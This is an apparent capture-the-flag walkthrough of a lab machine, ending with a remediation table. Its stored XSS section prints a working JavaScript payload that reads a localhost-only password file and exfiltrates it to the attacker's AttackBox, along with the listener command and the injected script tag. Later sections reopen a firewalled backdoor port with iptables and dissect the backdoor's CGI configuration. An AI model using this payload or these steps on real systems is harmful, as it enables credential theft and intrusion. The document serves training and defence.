3 Stored XSS — The Pivot to Localhost

The register.php page accepts user input and likely displays it on blog.php or an admin panel. We can inject JavaScript into the username field that will execute when someone (like the admin) views the page.

Our XSS payload will read the localhost-only file /dir/pass.txt and exfiltrate it to our AttackBox:

AttackBox — Create xss.js
var target_url = "http://127.0.0.1/dir/pass.txt";
var my_server = "http://10.11.63.57/data";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(my_server + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', target_url, true);
xhr.send(null);
💡 Why this works: The admin's browser runs on the server's localhost context. When they view our malicious script, it executes in their browser — which has access to 127.0.0.1. The script reads the protected file and sends it (base64 encoded) to our server.

Start a listener on port 80 to receive the exfiltration:

AttackBox — HTTP Listener
sudo python3 -m http.server 80

Register the malicious username:

Register Payload
<script src="http://10.11.63.57/xss.js"></script>

7 Unblocking the Backdoor — iptables

The admin mentioned they "temporarily blocked the attackers access to the backdoor by using iptables rules." We can reverse that with our sudo iptables rights.

First, check the current iptables rules:

List iptables Rules
sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT) num target prot opt source destination 1 DROP tcp -- anywhere anywhere tcp dpt:41312 2 ACCEPT all -- anywhere anywhere 3 ACCEPT all -- anywhere anywhere ctstate NEW,RELATED,ESTABLISHED 4 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh 5 ACCEPT tcp -- anywhere anywhere tcp dpt:http 6 ACCEPT icmp -- anywhere anywhere icmp echo-request 7 ACCEPT icmp -- anywhere anywhere icmp echo-reply 8 DROP all -- anywhere anywhere

Rule #1 blocks port 41312 — the backdoor port. We replace it with an ACCEPT rule:

Replace DROP with ACCEPT
sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
✅ Backdoor unblocked! The iptables rule that was blocking port 41312 has been replaced with an allow rule. The backdoor is now accessible externally.

8 Backdoor Analysis — The CGI Shell

The pcap and Apache config reveal a backdoor CGI script running on port 41312 with SSL. The Apache config shows:

Apache Config — Backdoor VirtualHost
Listen 41312
<VirtualHost *:41312>
    SSLEngine on
    SSLCipherSuite AES256-SHA
    SSLProtocol -all +TLSv1.2
    SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
    SSLCertificateKeyFile /etc/apache2/certs/apache.key
    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    AddHandler cgi-script .cgi .py .pl
    DocumentRoot /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
        Allow from all
    </Directory>
</VirtualHost>

The ScriptAlias maps /cgi-bin/ to /usr/lib/cgi-bin/, and Options +ExecCGI means Python files there will be executed when accessed — a classic backdoor setup. The script name 5UP3r53Cr37.py was identified from the pcap analysis.

Check Backdoor Script
ls -la /usr/lib/cgi-bin/
5UP3r53Cr37.py

🛡️ Remediation Advice

Issue Fix
Anonymous FTP enabled Disable anonymous FTP. Require authenticated access with strong credentials.
Sensitive files on FTP Never store operational notes or credential hints on publicly accessible services.
Stored XSS in register.php Sanitize all user input. Use output encoding when displaying user-supplied content. Implement CSP headers.
Credentials in web-accessible file Store credentials in a proper secrets manager. Localhost-only access is not sufficient protection when XSS can run in an admin's browser.
Jack's sudo iptables rights Restrict sudo access to only what's needed. Jack doesn't need iptables management.
Backdoor left on system After a compromise, completely reimage the system. Deleting files and blocking ports is insufficient — other backdoors may remain.
www-data NOPASSWD ALL Web server accounts should have zero sudo access. Use least privilege.
Immutable backdoor files Use chattr -i to remove immutable flag before deletion, but only after assessing the full compromise.
